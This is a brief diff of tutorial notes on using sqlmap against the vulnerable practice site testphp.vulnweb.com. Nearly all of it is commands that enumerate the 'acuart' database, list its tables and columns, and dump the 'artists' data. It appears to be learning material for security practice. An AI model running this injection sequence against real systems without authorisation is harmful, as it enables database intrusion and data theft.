@@ -1,0 +1,33 @@
+ sudo apt-get install sqlmap 
+
+
+used site:
+ http://testphp.vulnweb.com/listproducts.php?cat=1 
+
+
+To look at the set of parameters that can be passed:
+sqlmap -h 
+
+
+
+
+ List information about the existing databases 
+ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs 
+
+
+
+Step 2: List information about Tables present in a particular Database 
+ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 
+-D acuart --tables 
+
+
+
+List information about the columns of a particular table
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 
+-D acuart -T artists --columns 
+
+
+Dump the data from the columns 
+ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1
+-D acuart -T artists -C aname --dump 
